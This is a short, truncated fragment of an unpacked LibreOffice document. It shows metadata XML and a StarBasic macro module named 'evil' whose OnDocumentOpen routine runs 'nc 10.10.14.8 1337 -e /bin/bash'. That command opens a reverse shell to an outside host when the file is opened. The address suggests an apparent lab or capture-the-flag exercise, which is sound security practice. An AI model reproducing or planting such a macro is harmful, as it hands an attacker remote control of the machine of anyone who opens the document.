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Basic/Standard/evi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00:37:02.138022900</meta:creation-date>
    <dc:date>2025-03-23T00:40:45.811959500</dc:date>
    <meta:editing-duration>PT3M4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2.1.2$Windows_X86_64 LibreOffice_project/d3abf4aee5fd705e4a92bba33a32f40bc4e56f49</meta:generator>
  </office:meta>
</office:document-meta>
</file>

<file path=Basic/Standard/evil.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="evil" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****

Sub OnDocumentOpen
    Shell("nc 10.10.14.8 1337 -e /bin/bash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vi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